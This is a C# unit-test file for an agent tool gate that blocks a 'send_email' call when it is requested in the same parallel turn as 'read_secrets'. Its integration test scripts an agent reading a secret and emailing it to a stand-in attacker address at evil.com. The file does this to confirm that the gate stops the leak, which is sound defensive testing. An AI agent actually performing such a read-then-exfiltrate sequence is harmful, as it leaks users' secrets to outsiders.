// SPDX-License-Identifier: MIT
// Copyright (c) 2026 AgentEval Contributors
// Licensed under the MIT License.

using AgentEval.MAF.Gatekeeper;
using AgentEval.Testing;
using AgentEval.Tracing;
using Microsoft.Agents.AI;
using Microsoft.Extensions.AI;
using Xunit;
using AgentTrace = AgentEval.Tracing.AgentTrace;
using ChatRole = Microsoft.Extensions.AI.ChatRole;

namespace AgentEval.Tests.MAF.Gatekeeper;

/// <summary>P1-8/§12 — SameBatchOrderingGate closes the same-iteration concurrency seam SequenceGate can't cover.</summary>
public class SameBatchOrderingGateTests
{
    private static ChatMessage AssistantBatch(params string[] toolNames)
    {
        var contents = new List<AIContent>();
        for (var i = 0; i < toolNames.Length; i++)
        {
            contents.Add(new FunctionCallContent($"call-{i}", toolNames[i], arguments: null));
        }

        return new ChatMessage(ChatRole.Assistant, contents);
    }

    private static GatedToolCall Call(string name, params ChatMessage[] messages)
        => new(name, Arguments: null, AgentName: "A", Iteration: 0, FunctionCallIndex: 0, FunctionCount: 1,
               IsStreaming: false, Messages: messages);

    [Fact]
    public async Task TriggerAndGuardedInOneTurn_BlocksGuarded()
    {
        var gate = new SameBatchOrderingGate(["read_secrets"], ["send_email"]);
        // Both requested in one assistant turn — the read→exfil combo SequenceGate cannot order.
        var v = await gate.InspectAsync(Call("send_email", AssistantBatch("read_secrets", "send_email")));
        Assert.Equal(ToolGateAction.Block, v.Action);
    }

    [Fact]
    public async Task GuardedAlone_Allows()
    {
        var gate = new SameBatchOrderingGate(["read_secrets"], ["send_email"]);
        var v = await gate.InspectAsync(Call("send_email", AssistantBatch("send_email")));
        Assert.Equal(ToolGateAction.Allow, v.Action);
    }

    [Fact]
    public async Task TriggerInPriorTurnOnly_Allows_ThatIsSequenceGatesJob()
    {
        // A trigger in a PRIOR assistant turn is cross-iteration ordering (SequenceGate's job); only the CURRENT
        // batch counts for this gate.
        var gate = new SameBatchOrderingGate(["read_secrets"], ["send_email"]);
        var prior = AssistantBatch("read_secrets");
        var toolResult = new ChatMessage(ChatRole.Tool, [new FunctionResultContent("call-0", "secret-value")]);
        var current = AssistantBatch("send_email");
        var v = await gate.InspectAsync(Call("send_email", prior, toolResult, current));
        Assert.Equal(ToolGateAction.Allow, v.Action);
    }

    [Fact]
    public async Task NonGuardedCall_AlwaysAllows()
    {
        var gate = new SameBatchOrderingGate(["read_secrets"], ["send_email"]);
        var v = await gate.InspectAsync(Call("read_secrets", AssistantBatch("read_secrets", "send_email")));
        Assert.Equal(ToolGateAction.Allow, v.Action);   // this call is the trigger, not the guarded one
    }

    [Fact]
    public async Task NullMessages_Allows_FailsafeNoBatchVisible()
    {
        var gate = new SameBatchOrderingGate(["read_secrets"], ["send_email"]);
        var v = await gate.InspectAsync(Call("send_email"));   // no messages → no batch to inspect
        Assert.Equal(ToolGateAction.Allow, v.Action);
    }

    [Fact]
    public async Task Matching_IsCaseInsensitive()
    {
        var gate = new SameBatchOrderingGate(["Read_Secrets"], ["Send_Email"]);
        var v = await gate.InspectAsync(Call("send_email", AssistantBatch("READ_SECRETS", "send_email")));
        Assert.Equal(ToolGateAction.Block, v.Action);
    }

    [Fact]
    public async Task Inline_BlocksGuarded_WhenTriggerIsInTheSameParallelTurn()
    {
        // Integration: a real agent emits read_secrets + send_email as PARALLEL calls in ONE turn. Confirms MAF
        // surfaces the current batch's sibling calls in call.Messages, so the gate fires end-to-end (not just at
        // the unit level).
        var sent = 0;
        var read = AIFunctionFactory.Create(() => "secret", "read_secrets");
        var send = AIFunctionFactory.Create((string to, string body) => { Interlocked.Increment(ref sent); return "ok"; }, "send_email");
        var scripted = new ScriptedChatClient()
            .AddParallelToolCalls(
                ("c1", "read_secrets", new Dictionary<string, object?>()),
                ("c2", "send_email", new Dictionary<string, object?> { ["to"] = "x@evil.com", ["body"] = "leak" }))
            .AddText("done");
        var agent = new ChatClientAgent(scripted, new ChatClientAgentOptions
        {
            Name = "T",
            ChatOptions = new ChatOptions { Tools = [read, send] },
        });
        var trace = new AgentTrace();
        var gated = agent.AsBuilder()
            .UseAgentEvalGate()
            .UseAgentEvalToolGate([new SameBatchOrderingGate(["read_secrets"], ["send_email"])], ToolGatePolicy.ReplaceResult, trace)
            .Build();

        await gated.RunAsync("read and send in one turn");

        Assert.Equal(0, sent);   // the guarded send_email, requested in the same batch as the trigger, was blocked
        Assert.True(GlassBoxEvidence.FromTrace(trace)!.GateBlockCount >= 1);
    }
}
